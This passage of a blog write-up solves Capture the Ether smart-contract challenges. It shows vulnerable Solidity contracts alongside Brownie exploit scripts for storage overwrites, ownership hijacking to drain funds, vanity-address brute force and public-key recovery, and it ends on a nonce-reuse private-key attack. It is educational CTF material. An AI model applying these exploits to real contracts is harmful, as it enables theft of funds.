class="string">&#x27;value&#x27;</span>: <span class="string">&#x27;1 ether&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    contract.collectPenalty(&#123;<span class="string">&#x27;from&#x27;</span>: player&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> contract.isComplete() == <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<h2 id="Mapping"><a href="#Mapping" class="headerlink" title="Mapping"></a>Mapping</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">MappingChallenge</span> &#123;</span><br><span class="line">    bool public isComplete;</span><br><span class="line">    uint256[] map;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">set</span>(<span class="params">uint256 key, uint256 value</span>) public &#123;</span><br><span class="line">        <span class="comment">// Expand dynamic array as needed</span></span><br><span class="line">        <span class="keyword">if</span> (map.<span class="property">length</span> &lt;= key) &#123;</span><br><span class="line">            map.<span class="property">length</span> = key + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        map[key] = value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">get</span>(<span class="params">uint256 key</span>) public view returns (uint256) &#123;</span><br><span class="line">        <span class="keyword">return</span> map[key];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>To complete this challenge we need to make the bool <code>isComplete</code> to <code>true</code>. since we can change the length of the <code>map</code> which is an <code>uint256[]</code> we can update the length to <code>2^256</code> so we can get access to all the slots inside this contracts storage. now we can calculate the <code>index</code> number to which it points to the <code>slot 0</code> where the <code>isComplete</code> is in, and overwrite it with <code>0x01</code> hance the value of <code>isComplete</code> is <code>true</code>.</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> brownie <span class="keyword">import</span> MappingChallenge, accounts, web3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    deployer = accounts[<span class="number">0</span>]</span><br><span class="line">    player = accounts[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    contract = MappingChallenge.deploy(&#123;<span class="string">&#x27;from&#x27;</span>: deployer&#125;)</span><br><span class="line"></span><br><span class="line">    contract.<span class="built_in">set</span>(<span class="number">2</span>**<span class="number">256</span> - <span class="built_in">int</span>(web3.soliditySha3(</span><br><span class="line">        abi_types=[<span class="string">&#x27;uint256&#x27;</span>], values=[<span class="number">1</span>]).<span class="built_in">hex</span>()[<span class="number">2</span>:], <span class="number">16</span>), <span class="number">0x01</span>, &#123;<span class="string">&#x27;from&#x27;</span>: player&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> contract.isComplete() == <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<h2 id="Donation"><a href="#Donation" class="headerlink" title="Donation"></a>Donation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">DonationChallenge</span> &#123;</span><br><span class="line">    struct <span class="title class_">Donation</span> &#123;</span><br><span class="line">        uint256 timestamp;</span><br><span class="line">        uint256 etherAmount;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title class_">Donation</span>[] public donations;</span><br><span class="line"></span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">DonationChallenge</span>(<span class="params"></span>) public payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> == <span class="number">1</span> ether);</span><br><span class="line">        </span><br><span class="line">        owner = msg.<span class="property">sender</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isComplete</span>(<span class="params"></span>) public view returns (bool) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span> == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">donate</span>(<span class="params">uint256 etherAmount</span>) public payable &#123;</span><br><span class="line">        <span class="comment">// amount is in ether, but msg.value is in wei</span></span><br><span class="line">        uint256 scale = <span class="number">10</span>**<span class="number">18</span> * <span class="number">1</span> ether;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">value</span> == etherAmount / scale);</span><br><span class="line"></span><br><span class="line">        <span class="title class_">Donation</span> donation;</span><br><span class="line">        donation.<span class="property">timestamp</span> = now;</span><br><span class="line">        donation.<span class="property">etherAmount</span> = etherAmount;</span><br><span class="line"></span><br><span class="line">        donations.<span class="title function_">push</span>(donation);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">withdraw</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">sender</span> == owner);</span><br><span class="line">        </span><br><span class="line">        msg.<span class="property">sender</span>.<span class="title function_">transfer</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>To complete this challenge we need to steal the funds of this contract. we can steal the funds only if we are owner, since the function <code>donate()</code> creates an <code>uninitialized storage pointer</code> which will be pointing to <code>slot 0</code> by default. we the <code>donation.timestanp</code> overwrites the length of the <code>donations</code> array, and the <code>donation.etherAmount</code> will overwrite the owner variable. now there’s an other bug in this contract in the calculation of the scale which makes us easiar to give the value of the our address to the function to become owner since the scale is <code>10^36</code> we can send the value of our address divided by <code>10^36</code> and send the answee amount of ether and pass our address to the <code>donate()</code> function to become <code>owner</code> and we can steal the funds by calling <code>withdraw()</code> function.</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> brownie <span class="keyword">import</span> DonationChallenge, accounts</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    deployer = accounts[<span class="number">0</span>]</span><br><span class="line">    player = accounts[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    contract = DonationChallenge.deploy(&#123;<span class="string">&#x27;from&#x27;</span>: deployer, <span class="string">&#x27;value&#x27;</span>: <span class="string">&#x27;1 ether&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    contract.donate(<span class="built_in">int</span>(player.address, <span class="number">16</span>), &#123;</span><br><span class="line">                    <span class="string">&#x27;from&#x27;</span>: player, <span class="string">&#x27;value&#x27;</span>: <span class="built_in">int</span>(player.address, <span class="number">16</span>) // <span class="number">10</span>**<span class="number">36</span>&#125;)</span><br><span class="line">    <span class="keyword">assert</span> contract.owner() == player</span><br><span class="line">    contract.withdraw(&#123;<span class="string">&#x27;from&#x27;</span>: player&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> contract.isComplete() == <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<h2 id="Fifty-years"><a href="#Fifty-years" class="headerlink" title="Fifty years"></a>Fifty years</h2><hr>
<h3 id="Accounts"><a href="#Accounts" class="headerlink" title="Accounts"></a>Accounts</h3><h2 id="Fuzzy-identity"><a href="#Fuzzy-identity" class="headerlink" title="Fuzzy identity"></a>Fuzzy identity</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">IName</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">name</span>(<span class="params"></span>) external view returns (bytes32);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">FuzzyIdentityChallenge</span> &#123;</span><br><span class="line">    bool public isComplete;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">authenticate</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        <span class="built_in">require</span>(<span class="title function_">isSmarx</span>(msg.<span class="property">sender</span>));</span><br><span class="line">        <span class="built_in">require</span>(<span class="title function_">isBadCode</span>(msg.<span class="property">sender</span>));</span><br><span class="line"></span><br><span class="line">        isComplete = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isSmarx</span>(<span class="params">address addr</span>) internal view returns (bool) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">IName</span>(addr).<span class="title function_">name</span>() == <span class="title function_">bytes32</span>(<span class="string">&quot;smarx&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isBadCode</span>(<span class="params">address _addr</span>) internal pure returns (bool) &#123;</span><br><span class="line">        bytes20 addr = <span class="title function_">bytes20</span>(_addr);</span><br><span class="line">        bytes20 id = hex<span class="string">&quot;000000000000000000000000000000000badc0de&quot;</span>;</span><br><span class="line">        bytes20 mask = hex<span class="string">&quot;000000000000000000000000000000000fffffff&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (uint256 i = <span class="number">0</span>; i &lt; <span class="number">34</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (addr &amp; mask == id) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            mask &lt;&lt;= <span class="number">4</span>;</span><br><span class="line">            id &lt;&lt;= <span class="number">4</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>To solve this challenge we need to <code>authenticate</code> this contract with a contract which have <code>&#39;badc0de&#39;</code> in it’s address’s hex and return’s <code>&#39;smarx&#39;</code> for when function <code>name()</code> called. we can deploy a contract that returns the name but having <code>&#39;badc0de&#39;</code> inside address is something we can only achive by <strong>bruteforce</strong>. so we just need to brute for a address and a nonce which gives us the required address when we deploy the contract. after a lot of brute force got an address inside the console so I used that address.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">FuzzyIdentityChallenge</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">authenticate</span>(<span class="params"></span>) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Fi</span>_Exploit &#123;</span><br><span class="line">    bytes32 public name = <span class="title function_">bytes32</span>(<span class="string">&quot;smarx&quot;</span>);</span><br><span class="line">    <span class="title class_">FuzzyIdentityChallenge</span> fi;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address _address</span>) &#123;</span><br><span class="line">        fi = <span class="title class_">FuzzyIdentityChallenge</span>(_address);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">exploit</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        fi.<span class="title function_">authenticate</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> brownie <span class="keyword">import</span> FuzzyIdentityChallenge, Fi_Exploit, accounts, ZERO_ADDRESS</span><br><span class="line"><span class="keyword">from</span> eth_utils <span class="keyword">import</span> keccak, to_checksum_address</span><br><span class="line"><span class="keyword">from</span> rlp <span class="keyword">import</span> encode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">addr, i</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;badc0de&#x27;</span> <span class="keyword">in</span> to_checksum_address(keccak(encode([<span class="built_in">bytes</span>.fromhex(addr[<span class="number">2</span>:]), i]))[<span class="number">12</span>:]).lower()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find</span>():</span><br><span class="line">    hsh = get(accounts[<span class="number">0</span>].address, i)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> hsh:</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> i &lt; <span class="number">1000000</span>:</span><br><span class="line">            hsh = get(accounts[<span class="number">0</span>].address, i)</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> i % <span class="number">100</span> == <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span>(i)</span><br><span class="line">        accounts.remove(accounts[<span class="number">0</span>])</span><br><span class="line">        accounts.add()</span><br><span class="line">    <span class="built_in">print</span>(accounts[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    deployer = accounts[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># find() got Private_key: &#x27;0xa376e6c4be605caa488ff90fd81c72a93b7917af0ec8da1c8b46c930246856f5&#x27; and address: &#x27;0x6C37d4bb51dc59D11aDfA5aA454422944060cfcD&#x27; at &quot;i: 6&quot;</span></span><br><span class="line">    accounts.add(</span><br><span class="line">        private_key=<span class="string">&#x27;0xa376e6c4be605caa488ff90fd81c72a93b7917af0ec8da1c8b46c930246856f5&#x27;</span>)</span><br><span class="line">    player = accounts[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        player.transfer(to=ZERO_ADDRESS, amount=<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">assert</span> player.nonce == <span class="number">6</span></span><br><span class="line"></span><br><span class="line">    contract = FuzzyIdentityChallenge.deploy(&#123;<span class="string">&#x27;from&#x27;</span>: deployer&#125;)</span><br><span class="line">    iName = Fi_Exploit.deploy(contract.address, &#123;<span class="string">&#x27;from&#x27;</span>: player&#125;)</span><br><span class="line">    iName.exploit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> contract.isComplete() == <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<h2 id="Public-key"><a href="#Public-key" class="headerlink" title="Public key"></a>Public key</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">PublicKeyChallenge</span> &#123;</span><br><span class="line">    address owner = <span class="number">0x92b28647ae1f3264661f72fb2eb9625a89d88a31</span>;</span><br><span class="line">    bool public isComplete;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">authenticate</span>(<span class="params">bytes publicKey</span>) public &#123;</span><br><span class="line">        <span class="built_in">require</span>(<span class="title function_">address</span>(<span class="title function_">keccak256</span>(publicKey)) == owner);</span><br><span class="line"></span><br><span class="line">        isComplete = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>To solve this challenge we need to find the <code>PublicKey</code> of the given address since the address is last 20 bytes of the keccak hash of public key we cannot reverse the hash to obtain publickey. but there is an other way we can find the publickey if the address had made a transaction. since the transaction does contain the signature of the transaction and the publickey we can get the publickey if the address made any transaction.</p>
<p>looking at the <code>ropsten.etherscan.io</code> gives us 4 transactions made by from other addresses to this address and this address made one transaction with data <code>Thanks, man!</code></p>
<p>here’s the raw transaction:<br> <code>0xf87080843b9aca0083015f90946b477781b0e68031109f21887e6b5afeaaeb002b808c5468616e6b732c206d616e2129a0a5522718c0f95dde27f0827f55de836342ceda594d20458523dd71a539d52ad7a05710e64311d481764b5ae8ca691b05d14054782c7d489f3511a7abf2f5078962</code></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> brownie <span class="keyword">import</span> PublicKeyChallenge, accounts</span><br><span class="line"><span class="keyword">from</span> rlp <span class="keyword">import</span> encode, decode</span><br><span class="line"><span class="keyword">from</span> ethereum.transactions <span class="keyword">import</span> Transaction</span><br><span class="line"><span class="keyword">from</span> fastecdsa.curve <span class="keyword">import</span> secp256k1</span><br><span class="line"><span class="keyword">from</span> fastecdsa.point <span class="keyword">import</span> Point</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> sqrt_mod</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="keyword">from</span> eth_utils <span class="keyword">import</span> keccak, to_checksum_address</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recover_publicKey</span>(<span class="params">raw_tx, address</span>):</span><br><span class="line">    tx = decode(<span class="built_in">bytes</span>.fromhex(raw_tx[<span class="number">2</span>:]), Transaction)</span><br><span class="line">    <span class="comment"># print(tx.to_dict())</span></span><br><span class="line">    <span class="comment"># &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment">#      &#123;&#x27;nonce&#x27;: 0,</span></span><br><span class="line">    <span class="comment">#       &#x27;gasprice&#x27;: 1000000000,</span></span><br><span class="line">    <span class="comment">#       &#x27;startgas&#x27;: 90000,</span></span><br><span class="line">    <span class="comment">#       &#x27;to&#x27;: &#x27;0x6b477781b0e68031109f21887e6b5afeaaeb002b&#x27;,</span></span><br><span class="line">    <span class="comment">#       &#x27;value&#x27;: 0,</span></span><br><span class="line">    <span class="comment">#       &#x27;data&#x27;: &#x27;0x5468616e6b732c206d616e21&#x27;,</span></span><br><span class="line">    <span class="comment">#       &#x27;v&#x27;: 41,                                                                              # for some reason here chain id should is not 3</span></span><br><span class="line">    <span class="comment">#       &#x27;r&#x27;: 74776771311019569939017621593480679160618399812524181808306514788568607828695,</span></span><br><span class="line">    <span class="comment">#       &#x27;s&#x27;: 39381076589634547203973423246354256320472887426210737547826636053693505964386,</span></span><br><span class="line">    <span class="comment">#       &#x27;sender&#x27;: &#x27;0x92b28647ae1f3264661f72fb2eb9625a89d88a31&#x27;,</span></span><br><span class="line">    <span class="comment">#       &#x27;hash&#x27;: &#x27;0xabc467bedd1d17462fcc7942d0af7874d6f8bdefee2b299c9168a216d3ff0edb&#x27;&#125;</span></span><br><span class="line">    <span class="comment"># &#x27;&#x27;&#x27;</span></span><br><span class="line">    new_tx = Transaction(tx.nonce, tx.gasprice, tx.startgas,</span><br><span class="line">                         tx.to, tx.value, tx.data, <span class="number">3</span>)</span><br><span class="line">    r, s, a, b, p, q, G = tx.r, tx.s, secp256k1.a, secp256k1.b, secp256k1.p, secp256k1.q, secp256k1.G</span><br><span class="line">    data = Transaction.serialize(new_tx)</span><br><span class="line">    z = <span class="built_in">int</span>(keccak(encode(data)).<span class="built_in">hex</span>(), <span class="number">16</span>) % p</span><br><span class="line">    y = sqrt_mod((r**<span class="number">3</span> + a*r + b) % p, p, all_roots=<span class="literal">True</span>)</span><br><span class="line">    R = Point(r, y[<span class="number">0</span>], secp256k1)</span><br><span class="line">    R_ = Point(r, y[<span class="number">1</span>], secp256k1)</span><br><span class="line">    ri = <span class="built_in">int</span>(invert(r, q))</span><br><span class="line">    <span class="comment">#                                                                    s = k^-1 * ( h + r*d ) -&gt; s*R = ( h + r*d )*k^-1*k*G = ( h+ r*d )*G</span></span><br><span class="line">    <span class="comment">#                                                                     -&gt; (h*G + r*d*G)  -&gt; s*R - zG = (h*G + r*d*G - h*G ) = r*d*G -&gt; (s*R - zG)*ri = r*d*G*(r^-1) -&gt; -&gt; d*G</span></span><br><span class="line">    k = ri * (s*R - z*G)</span><br><span class="line">    k_ = ri * (s*R_ - z*G)</span><br><span class="line">    addr = keccak(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(k.x)[<span class="number">2</span>:]+<span class="built_in">hex</span>(k.y)[<span class="number">2</span>:]))[-<span class="number">20</span>:].<span class="built_in">hex</span>()</span><br><span class="line">    addr_ = keccak(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(k_.x)[<span class="number">2</span>:]+<span class="built_in">hex</span>(k_.y)[<span class="number">2</span>:]))[-<span class="number">20</span>:].<span class="built_in">hex</span>()</span><br><span class="line">    <span class="keyword">assert</span> address <span class="keyword">in</span> [addr, addr_], <span class="string">f&#x27;address not found!!&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># found publickey</span></span><br><span class="line">    publicKey = [k <span class="keyword">if</span> addr == address <span class="keyword">else</span> k_][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> publicKey</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    deployer = accounts[<span class="number">0</span>]</span><br><span class="line">    player = accounts[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    contract = PublicKeyChallenge.deploy(&#123;<span class="string">&#x27;from&#x27;</span>: deployer&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ropsten is depreciated, so i got this from other writeups online.</span></span><br><span class="line">    raw_tx = <span class="string">&#x27;0xf87080843b9aca0083015f90946b477781b0e68031109f21887e6b5afeaaeb002b808c5468616e6b732c206d616e2129a0a5522718c0f95dde27f0827f55de836342ceda594d20458523dd71a539d52ad7a05710e64311d481764b5ae8ca691b05d14054782c7d489f3511a7abf2f5078962&#x27;</span></span><br><span class="line"></span><br><span class="line">    publickey = recover_publicKey(</span><br><span class="line">        raw_tx, <span class="string">&#x27;92b28647ae1f3264661f72fb2eb9625a89d88a31&#x27;</span>)</span><br><span class="line">    <span class="comment"># after finding the publickey</span></span><br><span class="line"></span><br><span class="line">    contract.authenticate(</span><br><span class="line">        <span class="built_in">hex</span>(publicKey.x)+<span class="built_in">hex</span>(publicKey.y)[<span class="number">2</span>:], &#123;<span class="string">&#x27;from&#x27;</span>: player&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> contract.isComplete() == <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<h2 id="Account-takeover"><a href="#Account-takeover" class="headerlink" title="Account takeover"></a>Account takeover</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">AccountTakeoverChallenge</span> &#123;</span><br><span class="line">    address owner = <span class="number">0x6B477781b0e68031109f21887e6B5afEAaEB002b</span>;</span><br><span class="line">    bool public isComplete;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">authenticate</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">sender</span> == owner);</span><br><span class="line"></span><br><span class="line">        isComplete = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>This a similar challenge to the previous one, but here we need to overtake the account by recovering the <code>private key</code>. I have no clue how is that possible until I look at the etherscan for transaction and found <strong>two transactions with the same nonce</strong> that is they both have same <code>r</code> value which makes it very easy for us to crack the private key.</p>
